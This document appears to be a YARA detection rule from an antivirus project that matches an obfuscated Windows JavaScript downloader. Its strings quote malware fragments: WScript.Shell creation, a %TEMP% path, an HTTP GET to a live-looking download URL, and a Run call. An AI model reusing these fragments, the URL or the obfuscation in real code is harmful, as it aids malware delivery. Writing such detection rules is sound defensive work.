rule sig_20160427_159030dafe654746cd556c59b39429ff {
  meta:
    description = "datamaliciousorder - file 20160427_159030dafe654746cd556c59b39429ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d7b1aa05d95d8358f8911ccd6ad871abfb4d080536192d39a7b725d5911b9e0c"

  strings:
    $s1  = "function CwpspTlpum() {return BkmrhNzdgo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"yyp402L" ascii
    $s2  = "function CwpspTlpum() {return BkmrhNzdgo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"yyp402L" ascii
    $s3  = "function TjikyOvdtb(SmiqtSxfhc, AedpdZxguo){RhlooMcouq = RhlooMcouq * 1; return SmiqtSxfhc - AedpdZxguo;};" fullword ascii
    $s4  = "var BkmrhNzdgo = function NtsmkZldfm() {return TxlyjWmcts[FwmhgTwfot](\"WScript\"+\".Shell\");}(), YqdgqAvhze = 11;" fullword ascii
    $s5  = "ObneeCpkme[CstoeRttva](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var TxlyjWmcts = this[\"WScript\"];" fullword ascii
    $s7  = "if (ObneeCpkme[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function EwmsvDoxra(){return KntgiIbrxt + \"\";};" fullword ascii
    $s9  = "function GrwjdXgjbx() {return ((QhyieGpgct == true) && (QhyieGpgct == QtcodTiwdx)) ? 1 : RhlooMcouq;};" fullword ascii
    $s10 = "var QhyieGpgct = false;" fullword ascii
    $s11 = "var FovlgJzhxf = false;" fullword ascii
    $s12 = "FovlgJzhxf = true;" fullword ascii
    $s13 = "function XjnxtOxlyt(){return 23;};" fullword ascii
    $s14 = "QtcodTiwdx = true; " fullword ascii
    $s15 = "function XpdlbZnomm()" fullword ascii
    $s16 = "function PwgcdJvnae(YlhrbAsgls){BkmrhNzdgo[\"R\"+\"un\"](YlhrbAsgls, RhlooMcouq, RhlooMcouq);};" fullword ascii
    $s17 = "var UrmdvCjoaa = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var QtcodTiwdx = false;" fullword ascii
    $s19 = "return TjikyOvdtb(QzzabQcybe, UgsdrMsufx);" fullword ascii
    $s20 = "function BhiugIuffk(){return FwmhgTwfot;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}